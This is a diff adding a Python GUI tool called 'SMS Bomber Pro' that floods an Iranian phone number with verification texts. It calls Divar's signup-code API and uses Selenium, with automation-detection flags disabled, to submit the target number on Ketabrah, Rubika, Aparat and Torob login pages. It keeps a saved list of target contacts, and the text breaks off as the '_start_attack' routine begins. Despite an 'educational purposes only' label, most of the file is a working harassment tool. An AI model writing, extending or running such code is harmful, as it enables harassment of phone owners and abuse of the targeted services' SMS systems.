@@ -1,0 +1,1321 @@
+"""
+📱 SMS BOMBER PRO - نسخه کامل نهایی
+✅ پشتیبانی از تمام پیشوندهای ایران (091-099)
+✅ ۵ سایت (Divar, Ketabrah, Rubika, Aparat, Torob)
+✅ اعتبارسنجی اصلاح شده برای ترب
+✅ دابل کلیک روی مخاطبین
+✅ نمودار حرفه‌ای
+✅ تنظیمات کامل
+"""
+
+import customtkinter as ctk
+from tkinter import messagebox, scrolledtext, ttk
+import requests
+import threading
+import time
+import re
+import json
+import os
+from datetime import datetime
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from chromedriver_py import binary_path
+import matplotlib.pyplot as plt
+from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
+import winsound
+from tkinter import ttk as ttk_widgets
+import sys
+
+# ==================== تنظیمات اولیه ====================
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("blue")
+
+# ==================== API ها و URL ها ====================
+DIVAR_URL = "https://api.divar.ir/v8/authenticate/signinup/code"
+DIVAR_HEADERS = {"Content-Type": "application/json", "rid": "passwordless"}
+
+KETABRAH_URL = "https://ketabrah.com/users/signin"
+RUBIKA_URL = "https://web.rubika.ir/"
+APARAT_URL = "https://www.aparat.com/login"
+TOROB_URL = "https://torob.com/sell/login/"
+
+CONFIG_FILE = "config.json"
+HISTORY_FILE = "history.json"
+
+
+class ScrollableFrame(ctk.CTkScrollableFrame):
+    def __init__(self, master, **kwargs):
+        super().__init__(master, **kwargs)
+        self.grid_columnconfigure(0, weight=1)
+
+
+class ToolTip:
+    def __init__(self, widget, text):
+        self.widget = widget
+        self.text = text
+        self.tip_window = None
+        widget.bind('<Enter>', self.show_tip)
+        widget.bind('<Leave>', self.hide_tip)
+    
+    def show_tip(self, event=None):
+        if self.tip_window or not self.text:
+            return
+        x, y, _, _ = self.widget.bbox("insert")
+        x += self.widget.winfo_rootx() + 25
+        y += self.widget.winfo_rooty() + 25
+        self.tip_window = tw = ctk.CTkToplevel(self.widget)
+        tw.wm_overrideredirect(True)
+        tw.wm_geometry(f"+{x}+{y}")
+        label = ctk.CTkLabel(tw, text=self.text, justify="left",
+                            fg_color="#2d2d2d", text_color="#e0e0e0",
+                            corner_radius=8, padx=12, pady=6,
+                            font=("Inter", 10))
+        label.pack()
+    
+    def hide_tip(self, event=None):
+        if self.tip_window:
+            self.tip_window.destroy()
+            self.tip_window = None
+
+
+class Notification:
+    @staticmethod
+    def show(parent, message, type="info"):
+        popup = ctk.CTkToplevel(parent)
+        popup.title("")
+        popup.geometry("320x100")
+        popup.attributes('-topmost', True)
+        x = parent.winfo_x() + (parent.winfo_width() - 320) // 2
+        y = parent.winfo_y() + (parent.winfo_height() - 100) // 2
+        popup.geometry(f"+{x}+{y}")
+        colors = {"success": "#00C853", "error": "#D32F2F", "info": "#1976D2", "warning": "#FF9800"}
+        icons = {"success": "✓", "error": "✗", "info": "ℹ", "warning": "⚠"}
+        ctk.CTkLabel(popup, text=f"{icons.get(type, '📌')}  {message}", 
+                    font=("Segoe UI", 14), text_color=colors.get(type, "#FFFFFF")).pack(expand=True, pady=20)
+        popup.after(2000, popup.destroy)
+
+
+class SMSBomberPro(ctk.CTk):
+    
+    def __init__(self):
+        super().__init__()
+        self.title("SMS Bomber Pro - Complete Edition")
+        self.geometry("1400x950")
+        self.minsize(1200, 800)
+        
+        # متغیرهای اصلی
+        self.is_running = False
+        self.phone_history = []
+        self.blacklist = []
+        self.stats = {"success": 0, "failed": 0}
+        self.history = []
+        self.settings = self._load_settings()
+        
+        # بارگذاری داده‌ها
+        self._load_data()
+        self._load_history()
+        
+        # تنظیم تم
+        if self.settings.get("theme", "dark") == "light":
+            ctk.set_appearance_mode("light")
+        
+        # ساخت UI
+        self._setup_ui()
+        self._update_displays()
+        self._update_dashboard()
+        self._update_history_tab()
+        self.center_window()
+        
+        self._log("SMS Bomber Pro - Complete Edition started!", "success")
+        self._log("Sites: Divar, Ketabrah, Rubika, Aparat, Torob", "info")
+        
+        if self.settings.get("notifications", True):
+            Notification.show(self, "Application Ready - 5 Sites", "success")
+    
+    def center_window(self):
+        self.update_idletasks()
+        x = (self.winfo_screenwidth() - 1400) // 2
+        y = (self.winfo_screenheight() - 950) // 2
+        self.geometry(f"+{x}+{y}")
+    
+    # ==================== بارگذاری و ذخیره ====================
+    def _load_settings(self):
+        if os.path.exists(CONFIG_FILE):
+            try:
+                with open(CONFIG_FILE, "r", encoding="utf-8") as f:
+                    return json.load(f)
+            except:
+                pass
+        return {
+            "theme": "dark",
+            "notifications": True,
+            "sound": True,
+            "selenium_headless": False,
+            "default_delay": 3,
+            "timeout": 30
+        }
+    
+    def _save_settings(self):
+        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+            json.dump(self.settings, f, ensure_ascii=False, indent=2)
+    
+    def _load_data(self):
+        if os.path.exists("phones.json"):
+            try:
+                with open("phones.json", "r", encoding="utf-8") as f:
+                    data = json.load(f)
+                    self.phone_history = []
+                    for item in data:
+                        if isinstance(item, str):
+                            self.phone_history.append({"phone": item, "first_name": "", "last_name": ""})
+                        else:
+                            self.phone_history.append(item)
+            except:
+                self.phone_history = []
+        else:
+            self.phone_history = []
+        
+        if os.path.exists("blacklist.json"):
+            try:
+                with open("blacklist.json", "r", encoding="utf-8") as f:
+                    self.blacklist = json.load(f)
+            except:
+                self.blacklist = []
+    
+    def _load_history(self):
+        if os.path.exists(HISTORY_FILE):
+            try:
+                with open(HISTORY_FILE, "r", encoding="utf-8") as f:
+                    self.history = json.load(f)
+            except:
+                self.history = []
+    
+    def _save_history(self, entry):
+        self.history.insert(0, entry)
+        if len(self.history) > 100:
+            self.history = self.history[:100]
+        with open(HISTORY_FILE, "w", encoding="utf-8") as f:
+            json.dump(self.history, f, ensure_ascii=False, indent=2)
+        self._update_history_tab()
+    
+    def _save_data(self):
+        with open("phones.json", "w", encoding="utf-8") as f:
+            json.dump(self.phone_history, f, ensure_ascii=False, indent=2)
+        with open("blacklist.json", "w", encoding="utf-8") as f:
+            json.dump(self.blacklist, f, ensure_ascii=False, indent=2)
+    
+    # ==================== لاگ و آمار ====================
+    def _log(self, msg, level="info"):
+        ts = datetime.now().strftime("%H:%M:%S")
+        icons = {"success": "✓", "error": "✗", "warning": "⚠", "info": "ℹ"}
+        icon = icons.get(level, "ℹ")
+        self.log_area.configure(state="normal")
+        self.log_area.insert("end", f"[{ts}] {icon} {msg}\n", level)
+        self.log_area.see("end")
+        self.log_area.configure(state="disabled")
+    
+    def _update_stats_display(self):
+        total = self.stats["success"] + self.stats["failed"]
+        rate = (self.stats["success"] / total * 100) if total > 0 else 0
+        
+        if hasattr(self, 'success_card'):
+            self.success_card.configure(text=f"{self.stats['success']}")
+        if hasattr(self, 'failed_card'):
+            self.failed_card.configure(text=f"{self.stats['failed']}")
+        if hasattr(self, 'rate_card'):
+            self.rate_card.configure(text=f"{rate:.1f}%")
+        
+        self.stats_label.configure(text=f"✓ Success: {self.stats['success']}  |  ✗ Failed: {self.stats['failed']}  |  📈 Rate: {rate:.1f}%")
+        self.progress_bar.set(rate/100 if total > 0 else 0)
+        self._update_chart()
+    
+    def _update_chart(self):
+        if hasattr(self, 'chart_canvas'):
+            self.chart_canvas.get_tk_widget().destroy()
+        
+        bg_color = '#1e1e2e' if self.settings.get("theme") == "dark" else '#f5f5f5'
+        fig, ax = plt.subplots(figsize=(3, 2.5), facecolor=bg_color)
+        total = self.stats["success"] + self.stats["failed"]
+        
+        if total > 0:
+            sizes = [self.stats["success"], self.stats["failed"]]
+            labels = ['Success', 'Failed']
+            colors = ['#00C853', '#D32F2F']
+            wedges, texts, autotexts = ax.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90,
+                                                textprops={'fontsize': 9, 'color': 'white' if self.settings.get("theme") == "dark" else '#333'})
+            for autotext in autotexts:
+                autotext.set_color('white')
+                autotext.set_fontsize(9)
+            ax.axis('equal')
+        else:
+            ax.pie([1], colors=['#555555'], startangle=90)
+            ax.text(0, 0, 'No Data', ha='center', va='center', fontsize=12, color='#888888', fontweight='bold')
+            ax.axis('equal')
+        
+        fig.patch.set_alpha(0)
+        self.chart_canvas = FigureCanvasTkAgg(fig, self.chart_frame)
+        self.chart_canvas.draw()
+        self.chart_canvas.get_tk_widget().pack(fill="both", expand=True)
+    
+    def _update_dashboard(self):
+        self._update_stats_display()
+    
+    def _update_displays(self):
+        self.phone_listbox.configure(state="normal")
+        self.phone_listbox.delete(1.0, "end")
+        for i, contact in enumerate(self.phone_history, 1):
+            name = f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip()
+            phone = contact.get('phone', '')
+            if name:
+                display_text = f"{i:2d}. {name:15} - {phone}\n"
+            else:
+                display_text = f"{i:2d}. {phone}\n"
+            self.phone_listbox.insert("end", display_text)
+        self.phone_listbox.configure(state="disabled")
+        
+        self.black_listbox.configure(state="normal")
+        self.black_listbox.delete(1.0, "end")
+        for i, phone in enumerate(self.blacklist, 1):
+            self.black_listbox.insert("end", f"{i:2d}. {phone}\n")
+        self.black_listbox.configure(state="disabled")
+    
+    def _update_history_tab(self):
+        if hasattr(self, 'history_tree'):
+            for item in self.history_tree.get_children():
+                self.history_tree.delete(item)
+            for entry in self.history[:50]:
+                self.history_tree.insert("", "end", values=(
+                    entry.get('time', ''),
+                    entry.get('phone', ''),
+                    entry.get('mode', ''),
+                    f"{entry.get('success', 0)}/{entry.get('total', 0)}",
+                    entry.get('result', '')
+                ))
+    
+    # ==================== اعتبارسنجی اصلاح شده برای پشتیبانی از 099 و ترب ====================
+    def _validate_phone(self):
+        """اعتبارسنجی شماره تلفن با پشتیبانی از تمام پیشوندهای 091 تا 099"""
+        phone = self.phone_entry.get().strip()
+        
+        # حذف کاراکترهای غیرعددی
+        phone = re.sub(r'[^0-9]', '', phone)
+        
+        # اصلاح فرمت
+        if phone.startswith('98'):
+            phone = '0' + phone[2:]
+        elif len(phone) == 10 and phone.startswith('9'):
+            phone = '0' + phone
+        elif len(phone) == 11 and phone.startswith('09'):
+            pass  # فرمت درست
+        
+        # آپدیت فیلد
+        self.phone_entry.delete(0, "end")
+        self.phone_entry.insert(0, phone)
+        
+        # بررسی طول و پیشوند
+        if len(phone) == 11 and phone.startswith('09'):
+            # تشخیص اپراتور بر اساس 3 رقم اول بعد از 09
+            prefix = phone[2:5]
+            
+            # لیست کامل پیشوندهای اپراتورها
+            mci_prefixes = [
+                '910', '911', '912', '913', '914', '915', '916', '917', '918', '919',
+                '990', '991', '992', '993', '994', '995', '996', '997', '998', '999'
+            ]
+            irancell_prefixes = [
+                '901', '902', '903', '904', '905',
+                '930', '933', '935', '936', '937', '938', '939'
+            ]
+            rightel_prefixes = ['920', '921', '922']
+            
+            if prefix in mci_prefixes:
+                operator = "MCI (Hamrah Aval)"
+                self.phone_status.configure(text=f"✓ Valid | {operator} (0{prefix})", text_color="#4CAF50")
+                return True
+            elif prefix in irancell_prefixes:
+                operator = "Irancell"
+                self.phone_status.configure(text=f"✓ Valid | {operator} (0{prefix})", text_color="#4CAF50")
+                return True
+            elif prefix in rightel_prefixes:
+                operator = "Rightel"
+                self.phone_status.configure(text=f"✓ Valid | {operator} (0{prefix})", text_color="#4CAF50")
+                return True
+            else:
+                self.phone_status.configure(text=f"⚠️ Accepting: 0{prefix} (Unknown operator)", text_color="#FF9800")
+                return True  # قبول کن حتی اگه اپراتور ناشناس باشه
+        else:
+            self.phone_status.configure(text="✗ Invalid - Use 09XXXXXXXXX (11 digits)", text_color="#F44336")
+            return False
+    
+    # ==================== مدیریت مخاطبین ====================
+    def _on_contact_double_click(self, event):
+        try:
+            index = self.phone_listbox.index("@%d,%d" % (event.x, event.y))
+            line = self.phone_listbox.get(f"{index} linestart", f"{index} lineend")
+            if line.strip():
+                if " - " in line:
+                    phone = line.split(" - ")[1].strip()
+                else:
+                    parts = line.split(". ")
+                    if len(parts) > 1:
+                        phone = parts[1].strip()
+                    else:
+                        phone = line.strip()
+                phone = phone.strip()
+                self.phone_entry.delete(0, "end")
+                self.phone_entry.insert(0, phone)
+                self._validate_phone()
+                self._log(f"Double-click selected: {phone}", "info")
+        except Exception as e:
+            pass
+    
+    def _open_save_contact_dialog(self):
+        if not self._validate_phone():
+            messagebox.showwarning("Warning", "Enter a valid phone number first")
+            return
+        phone = self.phone_entry.get().strip()
+        for contact in self.phone_history:
+            if contact.get('phone') == phone:
+                messagebox.showwarning("Warning", "Phone number already exists!")
+                return
+        dialog = ctk.CTkToplevel(self)
+        dialog.title("Save Contact")
+        dialog.geometry("420x320")
+        dialog.resizable(False, False)
+        dialog.grab_set()
+        x = self.winfo_x() + (self.winfo_width() - 420) // 2
+        y = self.winfo_y() + (self.winfo_height() - 320) // 2
+        dialog.geometry(f"+{x}+{y}")
+        
+        ctk.CTkLabel(dialog, text="Phone Number:", font=("Segoe UI", 13, "bold")).pack(pady=(20, 5))
+        ctk.CTkLabel(dialog, text=phone, font=("Inter", 11)).pack()
+        ctk.CTkLabel(dialog, text="First Name:", font=("Segoe UI", 13, "bold")).pack(pady=(15, 5))
+        first_name_entry = ctk.CTkEntry(dialog, width=280, placeholder_text="e.g., Alex", font=("Inter", 11))
+        first_name_entry.pack()
+        ctk.CTkLabel(dialog, text="Last Name:", font=("Segoe UI", 13, "bold")).pack(pady=(10, 5))
+        last_name_entry = ctk.CTkEntry(dialog, width=280, placeholder_text="e.g., Johnson", font=("Inter", 11))
+        last_name_entry.pack()
+        
+        def save_contact():
+            first_name = first_name_entry.get().strip()
+            last_name = last_name_entry.get().strip()
+            if not first_name and not last_name:
+                messagebox.showwarning("Warning", "Enter at least first or last name!")
+                return
+            contact = {"phone": phone, "first_name": first_name, "last_name": last_name}
+            self.phone_history.append(contact)
+            self._save_data()
+            self._update_displays()
+            self._log(f"Saved: {first_name} {last_name} - {phone}", "success")
+            dialog.destroy()
+        
+        ctk.CTkButton(dialog, text="Save Contact", command=save_contact, width=180, height=40, 
+                     font=("Segoe UI", 13, "bold")).pack(pady=25)
+    
+    def _edit_contact(self):
+        try:
+            sel = self.phone_listbox.get("sel.first", "sel.last")
+            index = int(sel.strip().split(".")[0]) - 1
+            if index < 0 or index >= len(self.phone_history):
+                return
+            contact = self.phone_history[index]
+            dialog = ctk.CTkToplevel(self)
+            dialog.title("Edit Contact")
+            dialog.geometry("420x370")
+            dialog.resizable(False, False)
+            dialog.grab_set()
+            x = self.winfo_x() + (self.winfo_width() - 420) // 2
+            y = self.winfo_y() + (self.winfo_height() - 370) // 2
+            dialog.geometry(f"+{x}+{y}")
+            
+            ctk.CTkLabel(dialog, text="Phone Number:", font=("Segoe UI", 13, "bold")).pack(pady=(20, 5))
+            ctk.CTkLabel(dialog, text=contact.get('phone', ''), font=("Inter", 11)).pack()
+            ctk.CTkLabel(dialog, text="First Name:", font=("Segoe UI", 13, "bold")).pack(pady=(15, 5))
+            first_name_entry = ctk.CTkEntry(dialog, width=280, font=("Inter", 11))
+            first_name_entry.insert(0, contact.get('first_name', ''))
+            first_name_entry.pack()
+            ctk.CTkLabel(dialog, text="Last Name:", font=("Segoe UI", 13, "bold")).pack(pady=(10, 5))
+            last_name_entry = ctk.CTkEntry(dialog, width=280, font=("Inter", 11))
+            last_name_entry.insert(0, contact.get('last_name', ''))
+            last_name_entry.pack()
+            
+            def save_edit():
+                contact['first_name'] = first_name_entry.get().strip()
+                contact['last_name'] = last_name_entry.get().strip()
+                self._save_data()
+                self._update_displays()
+                self._log(f"Contact updated: {contact.get('first_name')} {contact.get('last_name')}", "success")
+                dialog.destroy()
+            
+            ctk.CTkButton(dialog, text="Save Changes", command=save_edit, width=180, height=40, 
+                        font=("Segoe UI", 13, "bold")).pack(pady=25)
+        except:
+            messagebox.showwarning("Error", "No contact selected!")
+    
+    def _delete_contact(self):
+        try:
+            sel = self.phone_listbox.get("sel.first", "sel.last")
+            index = int(sel.strip().split(".")[0]) - 1
+            if index < 0 or index >= len(self.phone_history):
+                return
+            contact = self.phone_history[index]
+            name = f"{contact.get('first_name', '')} {contact.get('last_name', '')}".strip()
+            phone = contact.get('phone', '')
+            if messagebox.askyesno("Confirm Delete", f"Delete {name} - {phone}?"):
+                self.phone_history.pop(index)
+                self._save_data()
+                self._update_displays()
+                self._log(f"Deleted: {name} - {phone}", "warning")
+        except:
+            messagebox.showwarning("Error", "No contact selected!")
+    
+    def _use_selected_contact(self):
+        try:
+            sel = self.phone_listbox.get("sel.first", "sel.last")
+            lines = sel.strip().split("\n")
+            display_text = lines[0]
+            if " - " in display_text:
+                phone = display_text.split(" - ")[1]
+            else:
+                phone = display_text.split(". ")[1]
+            self.phone_entry.delete(0, "end")
+            self.phone_entry.insert(0, phone)
+            self._validate_phone()
+            self._log(f"Selected: {phone}", "info")
+        except:
+            messagebox.showwarning("Error", "No contact selected!")
+    
+    def _save_phone_simple(self):
+        if not self._validate_phone():
+            return
+        phone = self.phone_entry.get().strip()
+        for contact in self.phone_history:
+            if contact.get('phone') == phone:
+                messagebox.showwarning("Warning", "Phone number already exists!")
+                return
+        self._open_save_contact_dialog()
+    
+    def _paste_phone(self):
+        try:
+            phone = self.clipboard_get().strip()
+            phone = re.sub(r'[^0-9]', '', phone)
+            if len(phone) >= 10:
+                self.phone_entry.delete(0, "end")
+                self.phone_entry.insert(0, phone)
+                self._log("Phone pasted from clipboard", "info")
+                self._validate_phone()
+            else:
+                self._log("Invalid phone in clipboard", "warning")
+        except:
+            self._log("Clipboard access error", "error")
+    
+    # ==================== لیست سیاه ====================
+    def _add_to_blacklist(self):
+        phone = self.phone_entry.get().strip()
+        if not self._validate_phone():
+            return
+        if phone not in self.blacklist:
+            self.blacklist.append(phone)
+            self._save_data()
+            self._update_displays()
+            self._log(f"Blacklisted: {phone}", "warning")
+            if self.settings.get("sound", True):
+                winsound.Beep(1000, 200)
+    
+    def _remove_from_blacklist(self):
+        try:
+            sel = self.black_listbox.get("sel.first", "sel.last")
+            phone = sel.strip().split(". ")[1]
+            if phone in self.blacklist:
+                self.blacklist.remove(phone)
+                self._save_data()
+                self._update_displays()
+                self._log(f"Removed from blacklist: {phone}", "success")
+        except:
+            messagebox.showwarning("Error", "No phone selected!")
+    
+    # ==================== تنظیمات ====================
+    def _clear_log(self):
+        self.log_area.configure(state="normal")
+        self.log_area.delete(1.0, "end")
+        self.log_area.configure(state="disabled")
+        self._log("Log cleared", "info")
+    
+    def _toggle_theme(self):
+        if self.settings.get("theme") == "dark":
+            ctk.set_appearance_mode("light")
+            self.settings["theme"] = "light"
+        else:
+            ctk.set_appearance_mode("dark")
+            self.settings["theme"] = "dark"
+        self._save_settings()
+        self._update_chart()
+        self._log(f"Theme changed to {self.settings['theme']}", "info")
+    
+    def _open_settings(self):
+        dialog = ctk.CTkToplevel(self)
+        dialog.title("Settings")
+        dialog.geometry("550x600")
+        dialog.resizable(False, False)
+        dialog.grab_set()
+        x = self.winfo_x() + (self.winfo_width() - 550) // 2
+        y = self.winfo_y() + (self.winfo_height() - 600) // 2
+        dialog.geometry(f"+{x}+{y}")
+        
+        ctk.CTkLabel(dialog, text="Application Settings", font=("Segoe UI", 22, "bold")).pack(pady=20)
+        
+        tabview = ctk.CTkTabview(dialog, width=500, height=450)
+        tabview.pack(padx=20, pady=10)
+        
+        general_tab = tabview.add("General")
+        
+        notif_var = ctk.BooleanVar(value=self.settings.get("notifications", True))
+        notif_switch = ctk.CTkSwitch(general_tab, text="Enable popup notifications", variable=notif_var, font=("Inter", 12))
+        notif_switch.pack(anchor="w", padx=20, pady=10)
+        
+        sound_var = ctk.BooleanVar(value=self.settings.get("sound", True))
+        sound_switch = ctk.CTkSwitch(general_tab, text="Enable sound effects", variable=sound_var, font=("Inter", 12))
+        sound_switch.pack(anchor="w", padx=20, pady=10)
+        
+        ctk.CTkLabel(general_tab, text="Default Delay (seconds):", font=("Segoe UI", 12, "bold")).pack(anchor="w", padx=20, pady=(20,5))
+        delay_entry = ctk.CTkEntry(general_tab, width=120, font=("Inter", 12))
+        delay_entry.insert(0, str(self.settings.get("default_delay", 3)))
+        delay_entry.pack(anchor="w", padx=20, pady=5)
+        
+        ctk.CTkLabel(general_tab, text="Request Timeout (seconds):", font=("Segoe UI", 12, "bold")).pack(anchor="w", padx=20, pady=(20,5))
+        timeout_entry = ctk.CTkEntry(general_tab, width=120, font=("Inter", 12))
+        timeout_entry.insert(0, str(self.settings.get("timeout", 30)))
+        timeout_entry.pack(anchor="w", padx=20, pady=5)
+        
+        validation_tab = tabview.add("Validation")
+        ctk.CTkLabel(validation_tab, text="Phone Number Validation Rules", font=("Segoe UI", 14, "bold")).pack(anchor="w", padx=20, pady=10)
+        ctk.CTkLabel(validation_tab, text="Supported prefixes: 091x, 092x, 093x, 090x, 099x", font=("Inter", 11), text_color="#4CAF50").pack(anchor="w", padx=20, pady=5)
+        ctk.CTkLabel(validation_tab, text="Format: 09XXXXXXXXX (11 digits)", font=("Inter", 11), text_color="#4CAF50").pack(anchor="w", padx=20, pady=5)
+        
+        browser_tab = tabview.add("Browser")
+        ctk.CTkLabel(browser_tab, text="Browser Mode", font=("Segoe UI", 14, "bold")).pack(anchor="w", padx=20, pady=10)
+        ctk.CTkLabel(browser_tab, text="Browser window is visible for debugging purposes", font=("Inter", 11), text_color="gray").pack(anchor="w", padx=20, pady=5)
+        
+        about_tab = tabview.add("👨‍💻 About")
+        ctk.CTkLabel(about_tab, text="SMS Bomber Pro", font=("Segoe UI", 18, "bold")).pack(pady=(30,5))
+        ctk.CTkLabel(about_tab, text="Version 6.2 - Complete Edition", font=("Inter", 12)).pack()
+        ctk.CTkLabel(about_tab, text="\n👨‍💻 Developer: Nima Koushki\n", font=("Segoe UI", 16, "bold"), text_color="#00BFFF").pack()
+        ctk.CTkLabel(about_tab, text="\nSites: Divar, Ketabrah, Rubika, Aparat, Torob\n", font=("Inter", 11), text_color="gray").pack()
+        ctk.CTkLabel(about_tab, text="All Iranian prefixes supported (091-099)", font=("Inter", 11), text_color="#4CAF50").pack()
+        ctk.CTkLabel(about_tab, text="For educational purposes only", font=("Inter", 10), text_color="gray").pack()
+        ctk.CTkLabel(about_tab, text="Kharazmi Festival 2025", font=("Inter", 10), text_color="gray").pack(pady=10)
+        
+        def save_settings():
+            self.settings["notifications"] = notif_var.get()
+            self.settings["sound"] = sound_var.get()
+            try:
+                self.settings["default_delay"] = int(delay_entry.get())
+            except:
+                pass
+            try:
+                self.settings["timeout"] = int(timeout_entry.get())
+            except:
+                pass
+            self._save_settings()
+            self._log("Settings saved", "success")
+            dialog.destroy()
+            if self.settings.get("notifications", True):
+                Notification.show(self, "Settings saved successfully", "success")
+        
+        ctk.CTkButton(dialog, text="Save Settings", command=save_settings, width=200, height=40, 
+                     font=("Segoe UI", 13, "bold")).pack(pady=20)
+    
+    # ==================== توابع ارسال ====================
+    def _send_via_divar_api(self, phone):
+        data = {"phoneNumber": phone}
+        try:
+            response = requests.post(DIVAR_URL, headers=DIVAR_HEADERS, json=data, timeout=self.settings.get("timeout", 30))
+            return response.status_code == 200
+        except:
+            return False
+    
+    def _send_via_ketabrah_selenium(self, phone):
+        driver = None
+        try:
+            options = Options()
+            if self.settings.get("selenium_headless", False):
+                options.add_argument("--headless")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            service = Service(binary_path)
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.set_page_load_timeout(self.settings.get("timeout", 30))
+            driver.get(KETABRAH_URL)
+            time.sleep(3)
+            phone_input = WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, "email")))
+            driver.execute_script("arguments[0].scrollIntoView(true);", phone_input)
+            time.sleep(0.5)
+            phone_input.click()
+            phone_input.clear()
+            phone_input.send_keys(phone)
+            time.sleep(1)
+            submit_btn = WebDriverWait(driver, 8).until(EC.element_to_be_clickable((By.ID, "btnSigninOrSignup")))
+            driver.execute_script("arguments[0].click();", submit_btn)
+            time.sleep(2)
+            return True
+        except Exception as e:
+            self._log(f"Ketabrah error: {str(e)[:80]}", "error")
+            return False
+        finally:
+            if driver:
+                driver.quit()
+    
+    def _send_via_rubika_selenium(self, phone):
+        driver = None
+        try:
+            options = Options()
+            if self.settings.get("selenium_headless", False):
+                options.add_argument("--headless")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            service = Service(binary_path)
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.set_page_load_timeout(self.settings.get("timeout", 30))
+            driver.get(RUBIKA_URL)
+            time.sleep(4)
+            phone_input = WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.NAME, "phone_number")))
+            driver.execute_script("arguments[0].scrollIntoView(true);", phone_input)
+            time.sleep(0.5)
+            phone_input.click()
+            phone_input.clear()
+            phone_input.send_keys(phone)
+            time.sleep(1)
+            try:
+                submit_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "div.c-ripple")))
+                driver.execute_script("arguments[0].click();", submit_btn)
+            except:
+                from selenium.webdriver.common.action_chains import ActionChains
+                ripple = driver.find_element(By.CSS_SELECTOR, "div.c-ripple")
+                ActionChains(driver).move_to_element(ripple).click().perform()
+            time.sleep(2)
+            return True
+        except Exception as e:
+            self._log(f"Rubika error: {str(e)[:80]}", "error")
+            return False
+        finally:
+            if driver:
+                driver.quit()
+    
+    def _send_via_aparat_selenium(self, phone):
+        driver = None
+        try:
+            options = Options()
+            if self.settings.get("selenium_headless", False):
+                options.add_argument("--headless")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            service = Service(binary_path)
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.set_page_load_timeout(self.settings.get("timeout", 30))
+            driver.get(APARAT_URL)
+            time.sleep(3)
+            phone_input = WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, "username")))
+            driver.execute_script("arguments[0].scrollIntoView(true);", phone_input)
+            time.sleep(0.5)
+            phone_input.click()
+            phone_input.clear()
+            phone_input.send_keys(phone)
+            time.sleep(1)
+            submit_btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.btn.btn-green.mt-12")))
+            driver.execute_script("arguments[0].click();", submit_btn)
+            time.sleep(2)
+            return True
+        except Exception as e:
+            self._log(f"Aparat error: {str(e)[:80]}", "error")
+            return False
+        finally:
+            if driver:
+                driver.quit()
+    
+    def _send_via_torob_selenium(self, phone):
+        driver = None
+        try:
+            options = Options()
+            if self.settings.get("selenium_headless", False):
+                options.add_argument("--headless")
+            options.add_argument("--disable-blink-features=AutomationControlled")
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_experimental_option("excludeSwitches", ["enable-automation"])
+            
+            service = Service(binary_path)
+            driver = webdriver.Chrome(service=service, options=options)
+            driver.set_page_load_timeout(self.settings.get("timeout", 30))
+            
+            driver.get(TOROB_URL)
+            time.sleep(5)
+            
+            # پیدا کردن فیلد شماره با چند روش مختلف
+            phone_input = None
+            try:
+                phone_input = WebDriverWait(driver, 15).until(
+                    EC.presence_of_element_located((By.XPATH, "//input[@placeholder='مثلا: ۰۹۱۲۳۴۵۶۷۸۳۴']"))
+                )
+            except:
+                try:
+                    phone_input = WebDriverWait(driver, 15).until(
+                        EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']"))
+                    )
+                except:
+                    try:
+                        phone_input = WebDriverWait(driver, 15).until(
+                            EC.presence_of_element_located((By.CSS_SELECTOR, "input.input_input__AKu_2"))
+                        )
+                    except:
+                        phone_input = WebDriverWait(driver, 15).until(
+                            EC.presence_of_element_located((By.TAG_NAME, "input"))
+                        )
+            
+            driver.execute_script("arguments[0].scrollIntoView(true);", phone_input)
+            time.sleep(1)
+            phone_input.click()
+            time.sleep(0.5)
+            phone_input.clear()
+            time.sleep(0.5)
+            
+            # وارد کردن شماره با JavaScript (مطمئن‌تر)
+            driver.execute_script("arguments[0].value = arguments[1];", phone_input, phone)
+            # تریگر رویدادها
+            driver.execute_script("arguments[0].dispatchEvent(new Event('input', {bubbles: true}));", phone_input)
+            driver.execute_script("arguments[0].dispatchEvent(new Event('change', {bubbles: true}));", phone_input)
+            
+            self._log(f"Torob: Phone entered: {phone}", "info")
+            time.sleep(1)
+            
+            # پیدا کردن دکمه دریافت کد
+            submit_btn = None
+            try:
+                submit_btn = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'دریافت کد')]"))
+                )
+            except:
+                try:
+                    submit_btn = WebDriverWait(driver, 10).until(
+                        EC.element_to_be_clickable((By.CSS_SELECTOR, "button[class*='button']"))
+                    )
+                except:
+                    submit_btn = WebDriverWait(driver, 10).until(
+                        EC.element_to_be_clickable((By.TAG_NAME, "button"))
+                    )
+            
+            driver.execute_script("arguments[0].click();", submit_btn)
+            time.sleep(2)
+            
+            return True
+            
+        except Exception as e:
+            self._log(f"Torob error: {str(e)[:80]}", "error")
+            return False
+        finally:
+            if driver:
+                driver.quit()
+    
+    # ==================== عملیات حمله ====================
+    def _start_attack(self):
+        if self.is_running:
+            return
+        if not self._validate_phone():
+            messagebox.showwarning("Error", "Invalid phone number")
+            return
+        phone = self.phone_entry.get().strip()
